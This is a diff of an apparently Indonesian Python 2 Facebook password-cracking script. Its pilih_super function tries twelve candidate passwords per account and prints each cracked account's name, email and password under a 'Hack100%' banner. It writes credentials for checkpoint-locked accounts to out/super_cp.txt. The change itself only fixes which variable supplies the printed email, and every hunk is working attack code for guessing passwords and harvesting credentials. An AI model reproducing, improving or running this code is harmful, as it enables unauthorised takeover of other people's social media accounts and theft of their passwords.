@@ -407,14 +407,14 @@ def pilih_super():
 				z = json.loads(x.text)
 				print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											
 				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
-				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + z['email']											
+				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + b['email']											
 				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											
 				oks.append(user+pass1)
                         else:
 			        if 'www.facebook.com' in q["error_msg"]:
 				    print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
 				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']
-				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + z['email']
+				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + b['email']
 				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'
 				    cek = open("out/super_cp.txt", "a")
 				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
@@ -429,14 +429,14 @@ def pilih_super():
 				            z = json.loads(x.text)
 				            print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											
 				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
-				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + z['email']										
+				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + b['email']									
 				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											
 				            oks.append(user+pass2)
                                     else:
 			                   if 'www.facebook.com' in q["error_msg"]:
 				               print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
 				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + z['email']
+				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + b['email']
 				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'
 				               cek = open("out/super_cp.txt", "a")
 				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
@@ -451,14 +451,14 @@ def pilih_super():
 				                       z = json.loads(x.text)
 						       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'								
 						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									
-						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + z['email']									
+						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + b['email']								
 						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									
 						       oks.append(user+pass3)
                                                else:
 			                               if 'www.facebook.com' in q["error_msg"]:
 				                           print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
 				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + z['email']
+				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + b['email']
 				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'
 				                           cek = open("out/super_cp.txt", "a")
 				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
@@ -473,14 +473,14 @@ def pilih_super():
 				                                   z = json.loads(x.text)
 				                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											
 				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
-				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + z['email']											
+				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + b['email']											
 				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											
 				                                   oks.append(user+pass4)
                                                            else:
 			                                           if 'www.facebook.com' in q["error_msg"]:
 				                                       print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
 				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + z['email']
+				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + b['email']
 				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'
 				                                       cek = open("out/super_cp.txt", "a")
 				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
@@ -495,14 +495,14 @@ def pilih_super():
 				                                               z = json.loads(x.text)
 						                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'						
 						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							
-						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + z['email']							
+						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + b['email']						
 						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							
 						                               oks.append(user+pass5)	
                                                                        else:
 			                                                       if 'www.facebook.com' in q["error_msg"]:
 				                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
 				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + z['email']
+				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + b['email']
 				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'
 				                                                   cek = open("out/super_cp.txt", "a")
 				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
@@ -517,14 +517,14 @@ def pilih_super():
 				                                                           z = json.loads(x.text)
 				                                                           print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											
 				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
-				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + z['email']											
+				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + b['email']										
 				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											
 				                                                           oks.append(user+pass6)
                                                                                    else:
 			                                                                   if 'www.facebook.com' in q["error_msg"]:
 				                                                               print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
 				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + z['email']
+				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + b['email']
 				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'
 				                                                               cek = open("out/super_cp.txt", "a")
 				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
@@ -539,14 +539,14 @@ def pilih_super():
 				                                                                       z = json.loads(x.text)
 									                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'					
 									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					
-									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + z['email']					
+									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + b['email']					
 									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					
 									                               oks.append(user+pass7)
                                                                                                else:
 			                                                                               if 'www.facebook.com' in q["error_msg"]:
 				                                                                           print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
 				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + z['email']
+				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + b['email']
 				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'
 				                                                                           cek = open("out/super_cp.txt", "a")
 				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
@@ -561,14 +561,14 @@ def pilih_super():
 				                                                                                   z = json.loads(x.text)
 				                                                                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											
 				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
-				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + z['email']											
+				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + b['email']										
 				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											
 				                                                                                   oks.append(user+pass8)
                                                                                                            else:
 			                                                                                           if 'www.facebook.com' in q["error_msg"]:
 				                                                                                       print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
 				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + z['email']
+				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + b['email']
 				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'
 				                                                                                       cek = open("out/super_cp.txt", "a")
 				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
@@ -583,14 +583,14 @@ def pilih_super():
 				                                                                                               z = json.loads(x.text)
 											                                       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'			
 											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			
-											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + z['email']			
+											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + b['email']		
 											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			
 											                                       oks.append(user+pass9)
                                                                                                                        else:
 			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
 				                                                                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
 				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + z['email']
+				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + b['email']
 				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'
 				                                                                                                   cek = open("out/super_cp.txt", "a")
 				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
@@ -605,14 +605,14 @@ def pilih_super():
 				                                                                                                           z = json.loads(x.text)
 				                                                                                                           print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											
 				                                                                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
-				                                                                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + z['email']											
+				                                                                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + b['email']											
 				                                                                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass10 + '\n'											
 				                                                                                                           oks.append(user+pass10)
                                                                                                                                    else:
 			                                                                                                                   if 'www.facebook.com' in q["error_msg"]:
 				                                                                                                               print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
 				                                                                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                                                                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + z['email']
+				                                                                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + b['email']
 				                                                                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass10 + '\n'
 				                                                                                                               cek = open("out/super_cp.txt", "a")
 				                                                                                                               cek.write("ID:" +user+ " Pw:" +pass10+"\n")
@@ -627,14 +627,14 @@ def pilih_super():
 				                                                                                                                       z = json.loads(x.text)
 													                                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'	
 													                                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']	
-													                                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + z['email']	
+													                                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + b['email']	
 													                                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass11 + '\n'	
 													                                               oks.append(user+pass11)	
                                                                                                                                                else:
 			                                                                                                                               if 'www.facebook.com' in q["error_msg"]:
 				                                                                                                                           print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
 				                                                                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                                                                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + z['email']
+				                                                                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + b['email']
 				                                                                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass11 + '\n'
 				                                                                                                                           cek = open("out/super_cp.txt", "a")
 				                                                                                                                           cek.write("ID:" +user+ " Pw:" +pass11+"\n")
@@ -649,14 +649,14 @@ def pilih_super():
 				                                                                                                                                   z = json.loads(x.text)
 				                                                                                                                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											
 				                                                                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
-				                                                                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + z['email']											
+				                                                                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + b['email']											
 				                                                                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass12 + '\n'											
 				                                                                                                                                   oks.append(user+pass12)
                                                                                                                                                            else:
 			                                                                                                                                           if 'www.facebook.com' in q["error_msg"]:
 				                                                                                                                                       print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
 				                                                                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                                                                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + z['email']
+				                                                                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + b['email']
 				                                                                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass12 + '\n'
 				                                                                                                                                       cek = open("out/super_cp.txt", "a")
 				                                                                                                                                       cek.write("ID:" +user+ " Pw:" +pass12+"\n")
